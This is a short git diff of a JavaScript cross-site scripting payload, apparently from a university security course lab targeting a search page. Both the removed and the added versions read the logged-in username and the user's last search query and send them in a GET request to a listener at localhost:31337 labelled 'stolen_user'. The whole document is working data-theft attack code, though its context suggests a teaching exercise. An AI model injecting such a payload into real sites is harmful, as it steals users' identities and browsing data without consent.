@@ -1,14 +1,7 @@
 <script>
-    $.get("https://project2.ecen4133.org/search?xssdefense=0", function (data) {
-        // Get the username by searching for the content in between this tag
-        re = /<span id="logged-in-user">.*<\/span>/;
-        var username = re.exec(data)[0].replace('<span id="logged-in-user">', '').replace('<\/span>', '');
-
-        // Similar regex search for the last query. It is found in between certain html tags
-        re = /<a href="search\?q=.*<\/a>/m;
-        var last_search = re.exec(data)[0].replace(/<a href="search\?q=.*class="history-item list-group-item">/m, '').replace('<\/a>', '');
-
-        // Send the parsed data to the hacker's server
-        $.get("http://localhost:31337/?stolen_user=" + username + "&last_search=" + last_search);
+    $(function() {
+      var username = window.document.getElementById("logged-in-user").innerHTML;
+      var last_search = window.document.getElementsByClassName("history-item list-group-item")[1].innerHTML;
+      $.get("http://localhost:31337/?stolen_user=" + username + "&last_search=" + last_search);
     });
 </script>
